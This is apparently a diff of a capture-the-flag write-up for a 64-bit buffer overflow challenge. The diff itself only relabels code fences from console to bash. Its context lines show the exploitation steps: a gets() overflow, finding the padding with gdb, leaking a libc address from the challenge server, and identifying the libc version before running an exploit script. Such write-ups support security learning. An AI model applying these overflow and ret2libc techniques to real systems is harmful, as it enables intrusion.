@@ -24,7 +24,7 @@ so we can write past the length of the buffer, leading to a classic buffer overf
 The gets() means we the input can contain any character, even \x00, except for newlines.
 
 Let's check what kind of binary we have and what protections it has.  
-```console
+```bash
 $ wget https://castorsctf20.ctfd.io/files/10d1b0797feecefc95e7660be8bbbab4/babybof?token=eyJ1c2VyX2lkIjo3MzMsInRlYW1faWQiOjMyMSwiZmlsZV9pZCI6MTExfQ.XtPiqA.baXDvvhSBLjPBNCcxZqEx05bqY8 -O bof
 $ file bof
 bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,  
@@ -68,7 +68,7 @@ The stack should look like this for main().
 We want to write past the buffer, overwrite the saved fram pointer, and then overwrite the saved return address our own address to our exploit.  
 We know that the buffer is 256 bytes from Ghidra, so we can use the following to test how much padding we need until we overwrite the return address.  
 In the diagram above, writing to buffer will make input go "up" the stack.  
-```console
+```bash
 $ python -c 'print "A"*256 + "B"*8 + "C"*8 + "D"*8 + "E"*8' > /tmp/asdf # Saves output to a file
 $ gdb ./bof
 (gdb) r < /tmp/asdf # Runs with contents of asdf as the input 
@@ -81,7 +81,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 We receive a segfault when we the binary with our input. It seems we stop at the ret instruction in main.  
 A ret instruction is like pop rip, so let's what the ret instruction was trying to get from the stack.  
-```console
+```bash
 (gdb) x/gx $rsp
 0x7fffffffdee8:	0x4343434343434343
 ```
@@ -160,7 +160,7 @@ p.close()
 ```
 
 Let's run the script:
-```console
+```bash
 $ python3 leak.py
 [+] Opening connection to chals20.cybercastors.com on port 14425: Done
 [*] 'bof'
@@ -186,7 +186,7 @@ We need to find out what version of libc is running on the server since differen
 Luckily there's a tool that finds the right libc version for you based on the address of a libc function.
 
 Download the database and tools [here](https://github.com/niklasb/libc-database) and then run the following:
-```console
+```bash
 $ ./find __libc_start_main 0x7fd7206d3fc0 
 http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
 ```
@@ -281,7 +281,7 @@ p.close()
 ```
 
 Run the script:
-```console
+```bash
 $ python3 exploit.py
 [+] Opening connection to chals20.cybercastors.com on port 14425: Done
 [*] '/home/user/castorsctf/babybof1pt2/bof'
